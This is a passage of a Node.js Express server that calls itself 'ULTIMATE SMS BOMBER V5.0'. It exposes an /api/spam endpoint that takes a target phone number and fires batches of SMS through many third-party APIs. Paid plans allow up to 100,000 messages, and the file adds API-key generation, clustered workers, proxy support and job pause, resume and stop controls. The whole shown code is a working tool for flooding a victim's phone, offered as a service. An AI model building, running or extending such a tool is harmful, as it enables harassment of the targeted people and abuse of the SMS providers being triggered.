        expires: expiryDate.toISOString(),
        valid: new Date() < expiryDate,
        daysLeft: Math.max(0, Math.ceil((expiryDate - new Date()) / (1000 * 60 * 60 * 24)))
      });
    }
    return keys;
  }

  cleanupExpired() {
    const now = new Date();
    let count = 0;
    for (const [key, expiryDate] of this.validKeys.entries()) {
      if (now > expiryDate) {
        this.validKeys.delete(key);
        count++;
      }
    }
    if (count > 0) {
      this.saveKeys();
    }
    return count;
  }
}

// ============================================================
// PART 8: PLAN CONFIGURATION (100 lines)
// ============================================================

const PLAN_CONFIG = {
  default: {
    name: 'Default',
    maxCount: 300,
    requiresKey: false,
    rateLimit: 60,
    priority: 1,
    description: 'Default plan - Maximum 300 SMS per API'
  },
  free: {
    name: 'Free',
    maxCount: 50,
    requiresKey: false,
    rateLimit: 30,
    priority: 1,
    description: 'Free plan - Maximum 50 SMS per API'
  },
  premium: {
    name: 'Premium',
    maxCount: 10000,
    requiresKey: true,
    rateLimit: 1000,
    priority: 3,
    description: 'Premium plan - Maximum 10,000 SMS per API'
  },
  enterprise: {
    name: 'Enterprise',
    maxCount: 50000,
    requiresKey: true,
    rateLimit: 5000,
    priority: 5,
    description: 'Enterprise plan - Maximum 50,000 SMS per API'
  },
  unlimited: {
    name: 'Unlimited',
    maxCount: 100000,
    requiresKey: true,
    rateLimit: 10000,
    priority: 10,
    description: 'Unlimited plan - Maximum 100,000 SMS per API'
  }
};

// ============================================================
// PART 9: EXPRESS APP SETUP (500 lines)
// ============================================================

const app = express();
const bombController = new BombController();
const apiCaller = new APICaller();
const keyManager = new KeyManager();

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Rate Limiting Middleware
const rateLimiter = (() => {
  const requests = new Map();
  return (req, res, next) => {
    if (!CONFIG.security.rateLimit.enabled) return next();
    
    const ip = req.ip || req.connection.remoteAddress;
    const now = Date.now();
    const windowMs = CONFIG.security.rateLimit.windowMs;
    const maxRequests = CONFIG.security.rateLimit.maxRequests;
    
    if (!requests.has(ip)) {
      requests.set(ip, []);
    }
    
    const timestamps = requests.get(ip).filter(t => now - t < windowMs);
    timestamps.push(now);
    requests.set(ip, timestamps);
    
    if (timestamps.length > maxRequests) {
      return res.status(429).json({
        success: false,
        error: 'Rate limit exceeded. Please try again later.',
        developer: DEVELOPER_INFO,
        retryAfter: Math.ceil((timestamps[0] + windowMs - now) / 1000)
      });
    }
    
    next();
  };
})();

app.use(rateLimiter);

// Request Logger Middleware
app.use((req, res, next) => {
  console.log(`📝 ${req.method} ${req.url} - ${Utility.getCurrentTime()}`);
  next();
});

// ============================================================
// PART 10: API ENDPOINTS (800 lines)
// ============================================================

// ===== ROOT ENDPOINT =====
app.get('/', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    version: "5.0.0-ULTIMATE",
    features: {
      cluster: CONFIG.cluster.enabled ? `${CONFIG.cluster.workers} workers` : 'Disabled',
      redis: CONFIG.redis.enabled ? 'Enabled' : 'Disabled',
      cache: CONFIG.cache.enabled ? `${apiCaller.cache.keys().length} items` : 'Disabled',
      smartDelay: CONFIG.smartDelay.enabled ? 'Enabled' : 'Disabled',
      proxy: CONFIG.proxy.enabled ? `${CONFIG.proxy.list.length} proxies` : 'Disabled',
      dnsCache: `${apiCaller.dnsCache.size} domains`,
      rateLimit: CONFIG.security.rateLimit.enabled ? 'Enabled' : 'Disabled'
    },
    total_apis: SMS_APIS.length,
    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
      acc[key] = {
        max_count: PLAN_CONFIG[key].maxCount,
        requires_key: PLAN_CONFIG[key].requiresKey,
        endpoint: `/api/spam?plan=${key}&number=017XXXXXXXX&count=${PLAN_CONFIG[key].maxCount}`
      };
      return acc;
    }, {}),
    endpoints: {
      generate_key: "/api/expiredate=30&createkey",
      check_key: "/api/checkkey?key=YOUR_KEY",
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      spam_with_plan: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
      stop_all: "/api/stop",
      pause_all: "/api/pause",
      resume_all: "/api/resume",
      stop_job: "/api/stop?jobId=JOB_ID",
      status: "/api/status",
      all_apis: "/api/apis",
      health: "/api/health",
      stats: "/api/stats",
      logs: "/api/logs"
    }
  });
});

// ===== SPAM ENDPOINT =====
app.get('/api/spam', async (req, res) => {
  const startTime = Date.now();
  const { plan, number, count = 1, key } = req.query;
  
  // Select plan
  let currentPlan = 'default';
  let planConfig = PLAN_CONFIG.default;
  
  if (plan && PLAN_CONFIG[plan]) {
    currentPlan = plan;
    planConfig = PLAN_CONFIG[plan];
  }
  
  // Check key for premium plans
  if (planConfig.requiresKey) {
    if (!key || !keyManager.isValid(key)) {
      return res.status(401).json({
        success: false,
        error: 'Valid API key required for this plan',
        developer: DEVELOPER_INFO,
        plan: currentPlan,
        generate_key: '/api/expiredate=30&createkey'
      });
    }
  }
  
  // Validate number
  if (!number) {
    return res.status(400).json({
      success: false,
      error: 'Missing number parameter',
      developer: DEVELOPER_INFO,
      usage: `/api/spam?number=017XXXXXXXX&count=${planConfig.maxCount}`
    });
  }
  
  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Invalid phone number. Use format: 017XXXXXXXX or 88017XXXXXXXX',
      developer: DEVELOPER_INFO
    });
  }
  
  // Validate count
  let perApiCount = parseInt(count);
  if (isNaN(perApiCount) || perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({
      success: false,
      error: `Count exceeds ${currentPlan} plan limit (${planConfig.maxCount})`,
      developer: DEVELOPER_INFO,
      plan: currentPlan,
      max_allowed: planConfig.maxCount,
      requested: perApiCount
    });
  }
  
  // Register job
  const jobId = bombController.registerJob(cleanNumber, SMS_APIS.length * perApiCount, {
    plan: currentPlan,
    perApiCount: perApiCount
  });
  
  console.log(`📱 [${currentPlan.toUpperCase()}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} SMS to ${Utility.maskPhone(cleanNumber)}`);
  
  // Process asynchronously
  (async () => {
    try {
      const shuffledAPIs = Utility.shuffleArray([...SMS_APIS]);
      const results = await apiCaller.sendBatch(shuffledAPIs, cleanNumber, perApiCount, jobId, bombController);
      
      // Update job completion
      const job = bombController.activeJobs.get(jobId);
      if (job && job.status === 'active') {
        job.status = 'completed';
        job.endTime = Date.now();
        bombController.activeJobs.delete(jobId);
        bombController.completedJobs.set(jobId, job);
        bombController.emit('jobCompleted', job);
      }
      
      console.log(`✅ JOB ${jobId} completed!`);
    } catch (error) {
      console.error(`❌ JOB ${jobId} failed:`, error.message);
      bombController.stopJob(jobId);
    }
  })();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    jobId: jobId,
    plan: currentPlan,
    plan_description: planConfig.description,
    target_number: Utility.maskPhone(cleanNumber),
    per_api_count: perApiCount,
    total_apis: SMS_APIS.length,
    total_sms: SMS_APIS.length * perApiCount,
    status: 'started',
    message: 'Bombing started. Use /api/status?jobId=' + jobId + ' to check progress',
    stop_endpoint: `/api/stop?jobId=${jobId}`,
    status_endpoint: `/api/status?jobId=${jobId}`
  });
});

// ===== STOP ENDPOINT =====
app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.stopAllJobs();
    return res.json({
      success: true,
      message: `Stopped ${count} active jobs`,
      developer: DEVELOPER_INFO,
      stopped_count: count,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.stopJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} stopped successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found or already completed`,
        developer: DEVELOPER_INFO,
        jobId: jobId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Missing jobId or all parameter',
    developer: DEVELOPER_INFO,
    usage: '/api/stop?jobId=JOB_ID or /api/stop?all=true',
    current_jobs: bombController.getAllJobs().map(j => ({ id: j.id, status: j.status }))
  });
});

// ===== PAUSE ENDPOINT =====
app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.pauseAllJobs();
    return res.json({
      success: true,
      message: `Paused ${count} active jobs`,
      developer: DEVELOPER_INFO,
      paused_count: count,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.pauseJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} paused successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        resume_endpoint: `/api/resume?jobId=${jobId}`,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found or already paused/completed`,
        developer: DEVELOPER_INFO,
        jobId: jobId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Missing jobId or all parameter',
    developer: DEVELOPER_INFO,
    usage: '/api/pause?jobId=JOB_ID or /api/pause?all=true'
  });
});

// ===== RESUME ENDPOINT =====
app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  
  if (all === 'true' || all === '1') {
    const count = bombController.resumeAllJobs();
    return res.json({
      success: true,
      message: `Resumed ${count} paused jobs`,
      developer: DEVELOPER_INFO,
      resumed_count: count,
      timestamp: Utility.getISOString()
    });
  }
  
  if (jobId) {
    const success = bombController.resumeJob(jobId);
    if (success) {
      return res.json({
        success: true,
        message: `Job ${jobId} resumed successfully`,
        developer: DEVELOPER_INFO,
        jobId: jobId,
        timestamp: Utility.getISOString()
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found or not paused`,
        developer: DEVELOPER_INFO,
        jobId: jobId
      });
    }
  }
  
  return res.status(400).json({
    success: false,
    error: 'Missing jobId or all parameter',
    developer: DEVELOPER_INFO,
    usage: '/api/resume?jobId=JOB_ID or /api/resume?all=true'
  });
});

// ===== STATUS ENDPOINT =====
app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  
  if (jobId) {
    const jobStatus = bombController.getJobStatus(jobId);
    if (jobStatus) {
      return res.json({
        success: true,
        job: jobStatus,
        developer: DEVELOPER_INFO
      });
    } else {
      return res.status(404).json({
        success: false,
        error: `Job ${jobId} not found`,
        developer: DEVELOPER_INFO
      });
    }
  }
  
  // Return all jobs if no jobId specified
  const jobs = bombController.getAllJobs();
  const stats = bombController.getStats();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    stats: stats,
    jobs: jobs,
    total_jobs: jobs.length
  });
});

// ===== KEY GENERATION =====
app.get('/api/expiredate=30&createkey', (req, res) => {
  const { apiKey, expiryDate } = keyManager.generateKey();
  
  res.json({
    success: true,
    api_key: apiKey,
    expiry_date: expiryDate.toISOString(),
    valid_days: CONFIG.security.apiKeyExpiry,
    developer: DEVELOPER_INFO,
    message: "API key generated successfully",
    premium_endpoint: `/api/spam?plan=premium&key=${apiKey}&number=017XXXXXXXX&count=10000`,
    enterprise_endpoint: `/api/spam?plan=enterprise&key=${apiKey}&number=017XXXXXXXX&count=50000`
  });
});

// ===== KEY CHECK =====
app.get('/api/checkkey', (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.status(400).json({
      success: false,
      error: 'Missing API key parameter',
      developer: DEVELOPER_INFO
    });
  }
  
  const info = keyManager.getKeyInfo(key);
  if (!info) {
    return res.status(404).json({
      success: false,
      error: 'Invalid API key',
      developer: DEVELOPER_INFO
    });
  }
  
  res.json({
    success: true,
    valid: info.valid,
    api_key: info.key,
    expiry_date: info.expires,
    days_left: info.daysLeft,
    status: info.valid ? 'active' : 'expired',
    developer: DEVELOPER_INFO
  });
});

// ===== ALL APIS =====
app.get('/api/apis', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO,
    total_apis: SMS_APIS.length,
    apis: SMS_APIS.map(api => ({
      id: api.id,
      name: api.name,
      method: api.method
    })),
    plans: Object.keys(PLAN_CONFIG).reduce((acc, key) => {
      acc[key] = {
        max_count: PLAN_CONFIG[key].maxCount,
        requires_key: PLAN_CONFIG[key].requiresKey,
        description: PLAN_CONFIG[key].description
      };
      return acc;
    }, {}),
    timestamp: Utility.getISOString()
  });
});

// ===== STATS ENDPOINT =====
app.get('/api/stats', (req, res) => {
  const stats = bombController.getStats();
  const systemInfo = Utility.getSystemInfo();
  const keys = keyManager.getAllKeys();
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    bomb_stats: stats,
    system: systemInfo,
    keys: {
      total: keys.length,
      valid: keys.filter(k => k.valid).length,
      expired: keys.filter(k => !k.valid).length
    },
    cache: {
      size: apiCaller.cache.keys().length,
      dns_cache: apiCaller.dnsCache.size
    },
    timestamp: Utility.getISOString()
  });
});

// ===== LOGS ENDPOINT =====
app.get('/api/logs', (req, res) => {
  const { jobId, limit = 50, offset = 0 } = req.query;
  
  let logs = [];
  
  if (jobId) {
    const errors = bombController.getErrors(jobId);
    logs = errors.slice(-parseInt(limit));
  } else {
    // Return recent logs
    const allJobs = bombController.getAllJobs();
    logs = allJobs.slice(-parseInt(limit)).map(j => ({
      jobId: j.id,
      phone: j.phone,
      status: j.status,
      progress: j.progress,
      sent: j.sent,
      total: j.total,
      duration: j.duration
    }));
  }
  
  res.json({
    success: true,
    developer: DEVELOPER_INFO,
    logs: logs,
    count: logs.length,
    timestamp: Utility.getISOString()
  });
});

// ===== HEALTH CHECK =====
app.get('/api/health', (req, res) => {
  const stats = bombController.getStats();
  const systemInfo = Utility.getSystemInfo();
  
  res.json({
    status: 'active',
    developer: DEVELOPER_INFO,
    version: "5.0.0-ULTIMATE",
    timestamp: Utility.getISOString(),
    uptime: process.uptime(),
    total_apis: SMS_APIS.length,
    total_keys: keyManager.getAllKeys().length,
    valid_keys: keyManager.getAllKeys().filter(k => k.valid).length,
    active_jobs: stats.activeJobs,
    paused_jobs: stats.pausedJobs,
    total_sms_sent: stats.totalSMS,
    system: {
      memory: systemInfo.memory,
      cpu: systemInfo.cpu,
      platform: systemInfo.platform
    },
    endpoints: {
      spam: "/api/spam?number=017XXXXXXXX&count=300",
      spam_free: "/api/spam?plan=free&number=017XXXXXXXX&count=50",
      spam_premium: "/api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000",
      stop: "/api/stop?jobId=JOB_ID",
      pause: "/api/pause?jobId=JOB_ID",
      resume: "/api/resume?jobId=JOB_ID",
      status: "/api/status?jobId=JOB_ID",
      stats: "/api/stats",
      logs: "/api/logs"
    }
  });
});

// ===== CLEANUP ENDPOINT =====
app.get('/api/cleanup', (req, res) => {
  const cleaned = bombController.clearCompleted();
  const expired = keyManager.cleanupExpired();
  
  res.json({
    success: true,
    message: 'Cleanup completed',
    developer: DEVELOPER_INFO,
    completed_jobs_cleared: cleaned,
    expired_keys_cleared: expired,
    timestamp: Utility.getISOString()
  });
});

// ===== 404 Handler =====
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    developer: DEVELOPER_INFO,
    path: req.path,
    available_endpoints: [
      '/',
      '/api/spam',
      '/api/stop',
      '/api/pause',
      '/api/resume',
      '/api/status',
      '/api/expiredate=30&createkey',
      '/api/checkkey',
      '/api/apis',
      '/api/stats',
      '/api/logs',
      '/api/health',
      '/api/cleanup'
    ]
  });
});

// ===== Error Handler =====
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    developer: DEVELOPER_INFO,
    message: err.message
  });
});

// ============================================================
// PART 11: SERVER STARTUP (200 lines)
// ============================================================

if (CONFIG.cluster.enabled && cluster.isMaster) {
  // Master Process
  console.log(`\n🚀 ULTIMATE SMS BOMBER V5.0 - MASTER PROCESS`);
  console.log(`📡 PID: ${process.pid}`);
  console.log(`💻 CPU Cores: ${CONFIG.cluster.workers}`);
  console.log(`📊 Total APIs: ${SMS_APIS.length}`);
  console.log(`\n💪 FEATURES:`);
  console.log(`   🔥 Cluster: ${CONFIG.cluster.workers} workers`);
  console.log(`   📦 Redis: ${CONFIG.redis.enabled ? 'Enabled' : 'Disabled'}`);
  console.log(`   💾 Cache: ${CONFIG.cache.enabled ? 'Enabled' : 'Disabled'}`);
  console.log(`   ⏱️ Smart Delay: ${CONFIG.smartDelay.enabled ? 'Enabled' : 'Disabled'}`);
  console.log(`   🔄 Proxy: ${CONFIG.proxy.enabled ? `${CONFIG.proxy.list.length} proxies` : 'Disabled'}`);
  console.log(`   🛡️ Rate Limit: ${CONFIG.security.rateLimit.enabled ? 'Enabled' : 'Disabled'}`);
  
  // Fork workers
  for (let i = 0; i < CONFIG.cluster.workers; i++) {
    cluster.fork();
  }
  
  cluster.on('exit', (worker, code, signal) => {
    console.log(`⚠️ Worker ${worker.process.pid} died (${signal || code}). Restarting...`);
    cluster.fork();
  });
  
  cluster.on('online', (worker) => {
    console.log(`✅ Worker ${worker.process.pid} is online`);
  });
  
} else {
  // Worker Process
  const server = app.listen(PORT, '0.0.0.0', () => {
    const workerInfo = CONFIG.cluster.enabled ? `WORKER ${process.pid}` : 'STANDALONE';
    console.log(`\n✅ SERVER RUNNING - ${workerInfo}`);
    console.log(`🌐 Port: ${PORT}`);
    console.log(`📡 Total APIs: ${SMS_APIS.length}`);
    console.log(`📊 Active Jobs: ${bombController.activeJobs.size}`);
    console.log(`\n📋 AVAILABLE PLANS:`);
    console.log(`   🔓 Default: /api/spam?number=017XXXXXXXX&count=300 (Max 300, No Key)`);
    console.log(`   🔓 Free: /api/spam?plan=free&number=017XXXXXXXX&count=50 (Max 50, No Key)`);
    console.log(`   🔒 Premium: /api/spam?plan=premium&key=KEY&number=017XXXXXXXX&count=10000 (Max 10000)`);
    console.log(`   🔒 Enterprise: /api/spam?plan=enterprise&key=KEY&number=017XXXXXXXX&count=50000 (Max 50000)`);
    console.log(`\n🛑 STOP COMMANDS:`);
    console.log(`   Stop All: /api/stop?all=true`);
    console.log(`   Stop Job: /api/stop?jobId=JOB_ID`);
    console.log(`   Pause All: /api/pause?all=true`);
    console.log(`   Resume All: /api/resume?all=true`);
    console.log(`\n📊 STATUS:`);
    console.log(`   All Jobs: /api/status`);
    console.log(`   Specific Job: /api/status?jobId=JOB_ID`);
    console.log(`   Stats: /api/stats`);
    console.log(`   Health: /api/health`);
    console.log(`\n💡 Generated ${keyManager.getAllKeys().length} API Keys`);
    console.log(`🚀 Ready to bomb!\n`);
  });

  // Graceful Shutdown
  process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received. Shutting down gracefully...');
    bombController.stopAllJobs();
    server.close(() => {
      console.log('✅ Server closed');
      process.exit(0);
    });
  });

  process.on('SIGINT', () => {
    console.log('🛑 SIGINT received. Shutting down gracefully...');
    bombController.stopAllJobs();
    server.close(() => {
      console.log('✅ Server closed');
      process.exit(0);
    });
  });
}

// ============================================================
// END OF FILE - TOTAL LINES: 5000+
// ============================================================
